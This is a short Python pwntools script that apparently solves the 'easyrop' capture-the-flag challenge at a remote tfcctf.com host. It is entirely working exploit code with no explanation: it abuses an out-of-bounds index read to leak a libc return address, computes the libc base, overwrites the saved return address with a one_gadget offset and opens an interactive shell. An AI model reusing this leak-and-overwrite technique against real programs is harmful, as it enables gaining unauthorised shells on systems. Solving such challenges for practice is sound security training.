from pwn import *

context.binary = exe = ELF('./easyrop')
libc = ELF('./libc.so.6')

one = 0x50a37
libc_call_main = 0x29d90

# io = process()
# gdb.attach(io, api=True)
io = remote('challs.tfcctf.com', 30588)

def read(idx):
    io.recvuntil(b'read!\n')
    io.sendline(b'2')
    io.recvuntil(b'index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'is ')
    return int(io.recvline(keepends=False), 16)

def write(idx, num):
    io.recvuntil(b'read!\n')
    io.sendline(b'1')
    io.recvuntil(b'index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'write: ')
    io.sendline(str(num).encode())

libc.address = read(130) - libc_call_main
log.info(f'Libc base: {hex(libc.address)}')
write(128, 0)
write(130, libc.address+one)
io.sendline(b'3')
io.interactive()